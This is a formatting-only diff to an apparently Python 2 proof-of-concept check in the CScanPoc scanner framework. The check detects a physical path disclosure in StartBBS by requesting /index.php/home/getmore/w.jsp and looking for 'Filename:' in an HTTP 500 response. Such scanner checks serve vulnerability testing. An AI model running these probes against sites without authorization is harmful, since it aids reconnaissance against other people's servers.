@@ -1,21 +1,22 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'StartBBS_0008' # 平台漏洞编号，留空
-    name = 'StartBBS 物理路径泄露' # 漏洞名称
-    level = VulnLevel.MED # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    vuln_id = 'StartBBS_0008'  # 平台漏洞编号，留空
+    name = 'StartBBS 物理路径泄露'  # 漏洞名称
+    level = VulnLevel.MED  # 漏洞危害级别
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2013-02-03'  # 漏洞公布时间
     desc = '''
         StartBBS /index.php/home/getmore/w.jsp 物理路径泄露。
-    ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'Unknown'  # 漏洞来源
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = 'StartBBS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
@@ -23,7 +24,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = 'a31e40b3-ad09-47c4-838a-576608119971'
     author = '国光'  # POC编写者
-    create_date = '2018-05-15' # POC创建时间
+    create_date = '2018-05-15'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -39,7 +40,8 @@ class Poc(ABPoc):
             Check_String = "Filename:"
             if code == 500:
                 if Check_String in res:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                        target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
